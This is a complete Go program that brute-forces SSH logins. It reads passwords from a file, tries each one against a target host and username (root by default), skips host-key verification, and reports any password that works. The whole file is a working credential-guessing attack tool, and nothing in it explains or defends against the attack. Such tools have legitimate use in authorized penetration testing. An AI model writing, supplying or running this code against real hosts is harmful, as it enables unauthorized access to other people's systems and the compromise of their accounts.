package main

import (
    "flag"
    "fmt"
    "io/ioutil"
    "strings"
    "os"
    "golang.org/x/crypto/ssh"
)

func main() {
    username := flag.String("u", "root", "username for SSH login")
    ip := flag.String("ip", "127.0.0.1:22", "IP and port for SSH login")
    passFile := flag.String("p", "ssh-password.txt", "file containing passwords to try")
    flag.Parse()

    // Open the file
    file, err := ioutil.ReadFile(*passFile)
    if err != nil {
        fmt.Println(err)
        return
    }

    // Split the file contents by newlines
    lines := strings.Split(string(file), "\n")
    found:=false
    // Iterate through each line
    for _, line := range lines {
        password := line

        // Set up the SSH client configuration
        config := &ssh.ClientConfig{
            User: *username,
            Auth: []ssh.AuthMethod{
                ssh.Password(password),
            },
            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        func() {
            // Print "Trying password"
            fmt.Printf("Trying %s:%s\n",*username,password)

            // Try to log in
            _, err := ssh.Dial("tcp", *ip, config)
            if err == nil {
                // If the login is successful, print the password and exit the program
                fmt.Printf("Successfully login with ip:%s username:%s password:%s\n",*ip,*username,password)
                found=true
                os.Exit(0)
            }
        }()
    }

    if !found {
        fmt.Printf("Password Not Found with ip:%s\n",*ip)
    }
}
